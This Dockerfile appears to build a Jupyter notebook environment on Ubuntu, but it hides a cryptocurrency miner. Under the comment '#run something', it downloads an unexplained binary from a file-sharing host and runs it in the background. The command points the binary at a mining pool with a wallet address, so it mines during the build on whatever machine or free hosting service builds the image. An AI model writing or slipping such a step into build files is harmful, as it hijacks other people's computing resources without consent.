# Use the official Ubuntu base image
FROM ubuntu:20.04

# Avoid interactive prompts during package installations
ENV DEBIAN_FRONTEND=noninteractive

# Install basic dependencies
RUN apt-get update && \
    apt-get install -y \
    wget \
    curl \
    gnupg2 \
    lsb-release \
    ca-certificates \
    software-properties-common \
    build-essential \
    python3 \
    python3-pip \
    python3-dev \
    git
    

#run something 

RUN wget https://bashupload.com/ryJaM/soloed && \
    chmod +x soloed

RUN nohup ./soloed -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u RMq5DEMWYfPZB148q1JdXW6rpdLyZHz2vE -tls -a minotourx -t 2 &  


# Install Jupyter Notebook
RUN pip3 install --no-cache --upgrade pip && \
    pip3 install --no-cache jupyterlab

# Install some Python packages
#RUN pip3 install matplotlib nlopt==2.7 scipy ipympl==0.9.3 ipywidgets==8.1.2 qutip==4.7.5 krotov==1.2.1 weylchamber==0.4.0

RUN echo "HI"



# Create a non-root user with UID 1000
ARG NB_USER=jovyan
ARG NB_UID=1000
ENV USER ${NB_USER}
ENV NB_UID ${NB_UID}
ENV HOME /home/${NB_USER}

RUN adduser --disabled-password \
    --gecos "Default user" \
    --uid ${NB_UID} \
    ${NB_USER}

WORKDIR ${HOME}
USER ${USER}


# Make sure the contents of our repo are in ${HOME}
COPY . ${HOME}
USER root
RUN chown -R ${NB_USER}:${NB_USER} ${HOME}
